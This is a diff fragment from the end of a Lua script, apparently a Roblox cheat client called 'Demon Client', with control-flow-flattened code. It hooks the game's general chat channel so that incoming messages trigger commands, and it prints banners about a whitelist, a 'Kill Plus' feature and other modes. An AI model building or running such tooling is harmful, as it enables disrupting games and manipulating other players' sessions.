+					if (0 == FlatIdent_95359) then
+						canal.OnIncomingMessage = function(mensagem)
+							ProcessarComando(mensagem.Text);
+						end;
+						print("✅ Sistema de comandos ativo!");
+						break;
+					end
+				end
+			end
+			break;
+		end
+		if (FlatIdent_6B92D == 0) then
+			wait(3);
+			canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral");
+			FlatIdent_6B92D = 1;
+		end
+	end
+end);
+WindUI:Notify("Lcc Client", "Sistema carregado com sucesso! ✅");
+print("🎮 DEMON CLIENT - SISTEMA FUNCIONANDO!");
+print("👑 Desenvolvido por: Lucas");
+print("📊 ABAS ORGANIZADAS:");
+print("   🛡️  Verify - Sistema de verificação");
+print("   ⚡ Comandos - Todos os comandos disponíveis");
+print("🎨 TEMA ROXO APLICADO!");
+print("🛡️  SISTEMA DE WHITELIST ATIVADO - USUÁRIO AUTORIZADO!");
+print("💀 KILL PLUS CORRIGIDO E FUNCIONAL!");
+print("🏷️  SISTEMA DE TAGS CORRIGIDO!");
+print("🚪 SISTEMA BACKROOMS ATUALIZADO!");
